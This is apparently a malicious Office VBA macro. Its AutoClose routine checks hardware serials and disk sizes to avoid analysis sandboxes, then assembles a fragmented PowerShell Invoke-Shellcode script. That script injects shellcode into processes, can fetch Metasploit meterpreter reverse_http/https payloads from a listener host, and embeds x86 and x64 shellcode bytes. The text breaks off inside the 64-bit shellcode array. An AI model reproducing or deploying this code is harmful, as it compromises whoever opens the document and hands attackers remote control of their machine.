Sub AutoClose()
        Pc
End Sub

Public Function Pc() As Variant
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
        Set ID = objWMIService.ExecQuery("Select IdentifyingNumber from Win32_ComputerSystemproduct")
        For Each objItem In ID
                If StrComp(objItem.IdentifyingNumber, "2UA20511KN") = 0 Then End
        Next
        Set disksize = objWMIService.ExecQuery("Select Size from Win32_logicaldisk")
        For Each objItem In disksize
                If (objItem.Size = 42949603328#) Then End
                If (objItem.Size = 68719443968#) Then End
        Next
        Dim LqkUN As String
        LqkUN = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        LqkUN = LqkUN + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        LqkUN = LqkUN + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        LqkUN = LqkUN + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        LqkUN = LqkUN + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        LqkUN = LqkUN + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        LqkUN = LqkUN + "    $Shellcode,
    [Parameter( ParameterSetName ="
        LqkUN = LqkUN + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        LqkUN = LqkUN + "reter/reverse_http',
                  'windows/me"
        LqkUN = LqkUN + "terpreter/reverse_https',
                  Ignore"
        LqkUN = LqkUN + "Case = $True )]
    [String]
    $Payload = 'windo"
        LqkUN = LqkUN + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        LqkUN = LqkUN + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        LqkUN = LqkUN + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        LqkUN = LqkUN + " = $True,
                ParameterSetName = 'Meta"
        LqkUN = LqkUN + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        LqkUN = LqkUN + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        LqkUN = LqkUN + "datory = $True,
                ParameterSetName ="
        LqkUN = LqkUN + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        LqkUN = LqkUN + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        LqkUN = LqkUN + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        LqkUN = LqkUN + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        LqkUN = LqkUN + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        LqkUN = LqkUN + "sion\Internet Settings').'User Agent',
    [Parame"
        LqkUN = LqkUN + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        LqkUN = LqkUN + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        LqkUN = LqkUN + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        LqkUN = LqkUN + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        LqkUN = LqkUN + "$False,
    [Switch]
    $Force = $False
)
    Set"
        LqkUN = LqkUN + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        LqkUN = LqkUN + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        LqkUN = LqkUN + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        LqkUN = LqkUN + "meters['Payload'].Attributes |
            Where-O"
        LqkUN = LqkUN + "bject {$_.TypeId -eq [System.Management.Automation"
        LqkUN = LqkUN + ".ValidateSetAttribute]}
        foreach ($Payload "
        LqkUN = LqkUN + "in $AvailablePayloads.ValidValues)
        {
     "
        LqkUN = LqkUN + "       New-Object PSObject -Property @{ Payloads ="
        LqkUN = LqkUN + " $Payload }
        }
        Return
    }
    if "
        LqkUN = LqkUN + "( $PSBoundParameters['ProcessID'] )
    {
        "
        LqkUN = LqkUN + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        LqkUN = LqkUN + "-Null
    }
    function Local:Get-DelegateType
  "
        LqkUN = LqkUN + "  {
        Param
        (
            [OutputTyp"
        LqkUN = LqkUN + "e([Type])]
            [Parameter( Position = 0)]
"
        LqkUN = LqkUN + "            [Type[]]
            $Parameters = (Ne"
        LqkUN = LqkUN + "w-Object Type[](0)),
            [Parameter( Posit"
        LqkUN = LqkUN + "ion = 1 )]
            [Type]
            $ReturnT"
        LqkUN = LqkUN + "ype = [Void]
        )
        $Domain = [AppDomai"
        LqkUN = LqkUN + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        LqkUN = LqkUN + "t System.Reflection.AssemblyName('ReflectedDelegat"
        LqkUN = LqkUN + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        LqkUN = LqkUN + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        LqkUN = LqkUN + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        LqkUN = LqkUN + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        LqkUN = LqkUN + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        LqkUN = LqkUN + "der.DefineType('MyDelegateType', 'Class, Public, S"
        LqkUN = LqkUN + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        LqkUN = LqkUN + "egate])
        $ConstructorBuilder = $TypeBuilder"
        LqkUN = LqkUN + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        LqkUN = LqkUN + "ic', [System.Reflection.CallingConventions]::Stand"
        LqkUN = LqkUN + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        LqkUN = LqkUN + "mplementationFlags('Runtime, Managed')
        $Me"
        LqkUN = LqkUN + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        LqkUN = LqkUN + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        LqkUN = LqkUN + ", $Parameters)
        $MethodBuilder.SetImplement"
        LqkUN = LqkUN + "ationFlags('Runtime, Managed')
        Write-Outpu"
        LqkUN = LqkUN + "t $TypeBuilder.CreateType()
    }
    function Loc"
        LqkUN = LqkUN + "al:Get-ProcAddress
    {
        Param
        (
 "
        LqkUN = LqkUN + "           [OutputType([IntPtr])]
            [Par"
        LqkUN = LqkUN + "ameter( Position = 0, Mandatory = $True )]
       "
        LqkUN = LqkUN + "     [String]
            $Module,
            [Pa"
        LqkUN = LqkUN + "rameter( Position = 1, Mandatory = $True )]
      "
        LqkUN = LqkUN + "      [String]
            $Procedure
        )
  "
        LqkUN = LqkUN + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        LqkUN = LqkUN + ".GetAssemblies() |
            Where-Object { $_.G"
        LqkUN = LqkUN + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        LqkUN = LqkUN + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        LqkUN = LqkUN + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        LqkUN = LqkUN + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        LqkUN = LqkUN + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        LqkUN = LqkUN + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        LqkUN = LqkUN + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        LqkUN = LqkUN + "eropServices.HandleRef], [String]))
        $Kern3"
        LqkUN = LqkUN + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        LqkUN = LqkUN + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        LqkUN = LqkUN + "ndleRef = New-Object System.Runtime.InteropService"
        LqkUN = LqkUN + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        LqkUN = LqkUN + "Output $GetProcAddress.Invoke($null, @([System.Run"
        LqkUN = LqkUN + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        LqkUN = LqkUN + "ure))
    }
    function Local:Emit-CallThreadStub"
        LqkUN = LqkUN + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        LqkUN = LqkUN + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        LqkUN = LqkUN + "chitecture / 8
        function Local:ConvertTo-Li"
        LqkUN = LqkUN + "ttleEndian ([IntPtr] $Address)
        {
         "
        LqkUN = LqkUN + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        LqkUN = LqkUN + "           $Address.ToString("X$($IntSizePtr*2)") "
        LqkUN = LqkUN + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        LqkUN = LqkUN + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        LqkUN = LqkUN + " } }
            [System.Array]::Reverse($LittleEn"
        LqkUN = LqkUN + "dianByteArray)
            Write-Output $LittleEnd"
        LqkUN = LqkUN + "ianByteArray
        }
        $CallStub = New-Obj"
        LqkUN = LqkUN + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        LqkUN = LqkUN + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        LqkUN = LqkUN + "                   # MOV   QWORD RAX, &shellcode
 "
        LqkUN = LqkUN + "           $CallStub += ConvertTo-LittleEndian $Ba"
        LqkUN = LqkUN + "seAddr       # &shellcode
            $CallStub +="
        LqkUN = LqkUN + " 0xFF,0xD0                              # CALL  RA"
        LqkUN = LqkUN + "X
            $CallStub += 0x6A,0x00              "
        LqkUN = LqkUN + "                # PUSH  BYTE 0
            $CallSt"
        LqkUN = LqkUN + "ub += 0x48,0xB8                              # MOV"
        LqkUN = LqkUN + "   QWORD RAX, &ExitThread
            $CallStub +="
        LqkUN = LqkUN + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        LqkUN = LqkUN + "ead
            $CallStub += 0xFF,0xD0            "
        LqkUN = LqkUN + "                  # CALL  RAX
        }
        el"
        LqkUN = LqkUN + "se
        {
            [Byte[]] $CallStub = 0xB8"
        LqkUN = LqkUN + "                           # MOV   DWORD EAX, &she"
        LqkUN = LqkUN + "llcode
            $CallStub += ConvertTo-LittleEn"
        LqkUN = LqkUN + "dian $BaseAddr       # &shellcode
            $Cal"
        LqkUN = LqkUN + "lStub += 0xFF,0xD0                              # "
        LqkUN = LqkUN + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        LqkUN = LqkUN + "                        # PUSH  BYTE 0
           "
        LqkUN = LqkUN + " $CallStub += 0xB8                                "
        LqkUN = LqkUN + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        LqkUN = LqkUN + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        LqkUN = LqkUN + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        LqkUN = LqkUN + "                          # CALL  EAX
        }
  "
        LqkUN = LqkUN + "      Write-Output $CallStub
    }
    function Lo"
        LqkUN = LqkUN + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        LqkUN = LqkUN + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        LqkUN = LqkUN + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        LqkUN = LqkUN + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        LqkUN = LqkUN + "        Throw "Unable to open a process handle for"
        LqkUN = LqkUN + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        LqkUN = LqkUN + "lse
        if ($64bitCPU) # Only perform theses c"
        LqkUN = LqkUN + "hecks if CPU is 64-bit
        {
            $IsWo"
        LqkUN = LqkUN + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        LqkUN = LqkUN + "-Null
            if ((!$IsWow64) -and $PowerShell"
        LqkUN = LqkUN + "32bit)
            {
                Throw 'Unable"
        LqkUN = LqkUN + " to inject 64-bit shellcode from within 32-bit Pow"
        LqkUN = LqkUN + "ershell. Use the 64-bit version of Powershell if y"
        LqkUN = LqkUN + "ou want this to work.'
            }
            e"
        LqkUN = LqkUN + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        LqkUN = LqkUN + "  {
                if ($Shellcode32.Length -eq 0)"
        LqkUN = LqkUN + "
                {
                    Throw 'No s"
        LqkUN = LqkUN + "hellcode was placed in the $Shellcode32 variable!'"
        LqkUN = LqkUN + "
                }
                $Shellcode = $S"
        LqkUN = LqkUN + "hellcode32
            }
            else # 64-bit"
        LqkUN = LqkUN + " process
            {
                if ($Shellc"
        LqkUN = LqkUN + "ode64.Length -eq 0)
                {
            "
        LqkUN = LqkUN + "        Throw 'No shellcode was placed in the $She"
        LqkUN = LqkUN + "llcode64 variable!'
                }
            "
        LqkUN = LqkUN + "    $Shellcode = $Shellcode64
            }
      "
        LqkUN = LqkUN + "  }
        else # 32-bit CPU
        {
          "
        LqkUN = LqkUN + "  if ($Shellcode32.Length -eq 0)
            {
   "
        LqkUN = LqkUN + "             Throw 'No shellcode was placed in the"
        LqkUN = LqkUN + " $Shellcode32 variable!'
            }
           "
        LqkUN = LqkUN + " $Shellcode = $Shellcode32
        }
        $Remo"
        LqkUN = LqkUN + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        LqkUN = LqkUN + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        LqkUN = LqkUN + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        LqkUN = LqkUN + ")
        {
            Throw "Unable to allocate "
        LqkUN = LqkUN + "shellcode memory in PID: $ProcessID"
        }
   "
        LqkUN = LqkUN + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        LqkUN = LqkUN + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        LqkUN = LqkUN + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        LqkUN = LqkUN + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        LqkUN = LqkUN + "      {
            $CallStub = Emit-CallThreadStu"
        LqkUN = LqkUN + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        LqkUN = LqkUN + "    else
        {
            $CallStub = Emit-Ca"
        LqkUN = LqkUN + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        LqkUN = LqkUN + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        LqkUN = LqkUN + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        LqkUN = LqkUN + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        LqkUN = LqkUN + "(!$RemoteStubAddr)
        {
            Throw "Un"
        LqkUN = LqkUN + "able to allocate thread call stub memory in PID: $"
        LqkUN = LqkUN + "ProcessID"
        }
        $WriteProcessMemory.I"
        LqkUN = LqkUN + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        LqkUN = LqkUN + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        LqkUN = LqkUN + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        LqkUN = LqkUN + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        LqkUN = LqkUN + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        LqkUN = LqkUN + "  {
            Throw "Unable to launch remote thr"
        LqkUN = LqkUN + "ead in PID: $ProcessID"
        }
        $CloseHa"
        LqkUN = LqkUN + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        LqkUN = LqkUN + "on Local:Inject-LocalShellcode
    {
        if ($"
        LqkUN = LqkUN + "PowerShell32bit) {
            if ($Shellcode32.Le"
        LqkUN = LqkUN + "ngth -eq 0)
            {
                Throw 'N"
        LqkUN = LqkUN + "o shellcode was placed in the $Shellcode32 variabl"
        LqkUN = LqkUN + "e!'
                return
            }
         "
        LqkUN = LqkUN + "   $Shellcode = $Shellcode32
        }
        els"
        LqkUN = LqkUN + "e
        {
            if ($Shellcode64.Length -e"
        LqkUN = LqkUN + "q 0)
            {
                Throw 'No shell"
        LqkUN = LqkUN + "code was placed in the $Shellcode64 variable!'
   "
        LqkUN = LqkUN + "             return
            }
            $She"
        LqkUN = LqkUN + "llcode = $Shellcode64
        }
        $BaseAddre"
        LqkUN = LqkUN + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        LqkUN = LqkUN + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        LqkUN = LqkUN + "X)
        if (!$BaseAddress)
        {
          "
        LqkUN = LqkUN + "  Throw "Unable to allocate shellcode memory in PI"
        LqkUN = LqkUN + "D: $ProcessID"
        }
        [System.Runtime.I"
        LqkUN = LqkUN + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        LqkUN = LqkUN + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        LqkUN = LqkUN + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        LqkUN = LqkUN + "  if ($PowerShell32bit)
        {
            $Cal"
        LqkUN = LqkUN + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        LqkUN = LqkUN + "adAddr 32
        }
        else
        {
       "
        LqkUN = LqkUN + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        LqkUN = LqkUN + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        LqkUN = LqkUN + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        LqkUN = LqkUN + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        LqkUN = LqkUN + "X)
        if (!$CallStubAddress)
        {
      "
        LqkUN = LqkUN + "      Throw "Unable to allocate thread call stub.""
        LqkUN = LqkUN + "
        }
        [System.Runtime.InteropServices"
        LqkUN = LqkUN + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        LqkUN = LqkUN + "allStub.Length)
        $ThreadHandle = $CreateThr"
        LqkUN = LqkUN + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        LqkUN = LqkUN + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        LqkUN = LqkUN + "dHandle)
        {
            Throw "Unable to la"
        LqkUN = LqkUN + "unch thread."
        }
        $WaitForSingleObje"
        LqkUN = LqkUN + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        LqkUN = LqkUN + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        LqkUN = LqkUN + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        LqkUN = LqkUN + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        LqkUN = LqkUN + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        LqkUN = LqkUN + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        LqkUN = LqkUN + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        LqkUN = LqkUN + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        LqkUN = LqkUN + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        LqkUN = LqkUN + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        LqkUN = LqkUN + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        LqkUN = LqkUN + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        LqkUN = LqkUN + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        LqkUN = LqkUN + "  else
    {
        $64bitCPU = $false
    }
    "
        LqkUN = LqkUN + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        LqkUN = LqkUN + "l32bit = $true
    }
    else
    {
        $Power"
        LqkUN = LqkUN + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        LqkUN = LqkUN + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        LqkUN = LqkUN + "owerShell32bit) {
            $RootInvocation = $M"
        LqkUN = LqkUN + "yInvocation.Line
            $Response = $True
   "
        LqkUN = LqkUN + "         if ( $Force -or ( $Response = $psCmdlet.S"
        LqkUN = LqkUN + "houldContinue( "Do you want to launch the payload "
        LqkUN = LqkUN + "from x86 Powershell?",
                   "Attempt"
        LqkUN = LqkUN + " to execute 32-bit shellcode from 64-bit Powershel"
        LqkUN = LqkUN + "l. Note: This process takes about one minute. Be p"
        LqkUN = LqkUN + "atient! You will also see some artifacts of the sc"
        LqkUN = LqkUN + "ript loading in the other process." ) ) ) { }
    "
        LqkUN = LqkUN + "        if ( !$Response )
            {
          "
        LqkUN = LqkUN + "      Return
            }
            if ($MyInvo"
        LqkUN = LqkUN + "cation.BoundParameters['Force'])
            {
   "
        LqkUN = LqkUN + "             $Command = "function $($MyInvocation."
        LqkUN = LqkUN + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        LqkUN = LqkUN + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        LqkUN = LqkUN + "   }
            else
            {
              "
        LqkUN = LqkUN + "  $Command = "function $($MyInvocation.InvocationN"
        LqkUN = LqkUN + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        LqkUN = LqkUN + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        LqkUN = LqkUN + "
            $CommandBytes = [System.Text.Encoding"
        LqkUN = LqkUN + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        LqkUN = LqkUN + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        LqkUN = LqkUN + "           $Execute = '$Command' + " | $Env:windir"
        LqkUN = LqkUN + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        LqkUN = LqkUN + "oProfile -Command -"
            Invoke-Expression"
        LqkUN = LqkUN + " -Command $Execute | Out-Null
            Return
 "
        LqkUN = LqkUN + "       }
        $Response = $True
        if ( $F"
        LqkUN = LqkUN + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        LqkUN = LqkUN + "Do you know what you're doing?",
               "A"
        LqkUN = LqkUN + "bout to download Metasploit payload '$($Payload)' "
        LqkUN = LqkUN + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        LqkUN = LqkUN + "  if ( !$Response )
        {
            Return
 "
        LqkUN = LqkUN + "       }
        switch ($Payload)
        {
     "
        LqkUN = LqkUN + "       'windows/meterpreter/reverse_http'
        "
        LqkUN = LqkUN + "    {
                $SSL = ''
            }
    "
        LqkUN = LqkUN + "        'windows/meterpreter/reverse_https'
      "
        LqkUN = LqkUN + "      {
                $SSL = 's'
               "
        LqkUN = LqkUN + " [System.Net.ServicePointManager]::ServerCertifica"
        LqkUN = LqkUN + "teValidationCallback = {$True}
            }
     "
        LqkUN = LqkUN + "   }
        if ($Legacy)
        {
            $R"
        LqkUN = LqkUN + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        LqkUN = LqkUN + "
        } else {
            $CharArray = 48..57 "
        LqkUN = LqkUN + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        LqkUN = LqkUN + "         $SumTest = $False
            while ($Sum"
        LqkUN = LqkUN + "Test -eq $False)
            {
                $Ge"
        LqkUN = LqkUN + "neratedUri = $CharArray | Get-Random -Count 4
    "
        LqkUN = LqkUN + "            $SumTest = (([int[]] $GeneratedUri | M"
        LqkUN = LqkUN + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        LqkUN = LqkUN + "  }
            $RequestUri = -join $GeneratedUri
"
        LqkUN = LqkUN + "            $Request = "http$($SSL)://$($Lhost):$("
        LqkUN = LqkUN + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        LqkUN = LqkUN + "ew-Object Uri($Request)
        $WebClient = New-O"
        LqkUN = LqkUN + "bject System.Net.WebClient
        $WebClient.Head"
        LqkUN = LqkUN + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        LqkUN = LqkUN + "roxy)
        {
            $WebProxyObject = New-"
        LqkUN = LqkUN + "Object System.Net.WebProxy
            $ProxyAddre"
        LqkUN = LqkUN + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        LqkUN = LqkUN + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        LqkUN = LqkUN + "oxyServer
            if ($ProxyAddress)
         "
        LqkUN = LqkUN + "   {
                $WebProxyObject.Address = $Pr"
        LqkUN = LqkUN + "oxyAddress
                $WebProxyObject.UseDefa"
        LqkUN = LqkUN + "ultCredentials = $True
                $WebClientO"
        LqkUN = LqkUN + "bject.Proxy = $WebProxyObject
            }
      "
        LqkUN = LqkUN + "  }
        try
        {
            [Byte[]] $Sh"
        LqkUN = LqkUN + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        LqkUN = LqkUN + "}
        catch
        {
            Throw "$($Er"
        LqkUN = LqkUN + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        LqkUN = LqkUN + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        LqkUN = LqkUN + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        LqkUN = LqkUN + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        LqkUN = LqkUN + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        LqkUN = LqkUN + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        LqkUN = LqkUN + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        LqkUN = LqkUN + "                             0x52,0x0c,0x8b,0x52,0"
        LqkUN = LqkUN + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        LqkUN = LqkUN + "x31,0xc0,
                                  0xac,0"
        LqkUN = LqkUN + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        LqkUN = LqkUN + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        LqkUN = LqkUN + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        LqkUN = LqkUN + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        LqkUN = LqkUN + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        LqkUN = LqkUN + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        LqkUN = LqkUN + "x8b,
                                  0x01,0xd6,0"
        LqkUN = LqkUN + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        LqkUN = LqkUN + "x38,0xe0,0x75,0xf4,
                              "
        LqkUN = LqkUN + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        LqkUN = LqkUN + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        LqkUN = LqkUN + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        LqkUN = LqkUN + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        LqkUN = LqkUN + "                                  0x5b,0x5b,0x61,0"
        LqkUN = LqkUN + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        LqkUN = LqkUN + "xeb,0x86,0x5d,
                                  0"
        LqkUN = LqkUN + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        LqkUN = LqkUN + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        LqkUN = LqkUN + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        LqkUN = LqkUN + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        LqkUN = LqkUN + "                             0x80,0xfb,0xe0,0x75,0"
        LqkUN = LqkUN + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        LqkUN = LqkUN + "xd5,0x63,
                                  0x61,0"
        LqkUN = LqkUN + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        LqkUN = LqkUN + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        LqkUN = LqkUN + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        LqkUN = LqkUN + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        LqkUN = LqkUN + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        LqkUN = LqkUN + "                             0x20,0x48,0x8b,0x72,0"
        LqkUN = LqkUN + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        LqkUN = LqkUN + "x31,0xc0,
                                  0xac,0"
        LqkUN = LqkUN + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        LqkUN = LqkUN + "x41,0x01,0xc1,0xe2,0xed,
                         "
        LqkUN = LqkUN + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        LqkUN = LqkUN + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        LqkUN = LqkUN + "                        0x00,0x00,0x00,0x48,0x85,0"
        LqkUN = LqkUN + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        LqkUN = LqkUN + "x44,
                                  0x8b,0x40,0"
        LqkUN = LqkUN + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        LqkUN = LqkUN + "x8b,0x34,0x88,0x48,
                              "
        LqkUN = LqkUN + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        LqkUN = LqkUN + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        LqkUN = LqkUN + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        LqkUN = LqkUN + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        LqkUN = LqkUN + "                                  0x8b,0x40,0x24,0"
        LqkUN = LqkUN + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        LqkUN = LqkUN + "x40,0x1c,0x49,
                                  0"
        LqkUN = LqkUN + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
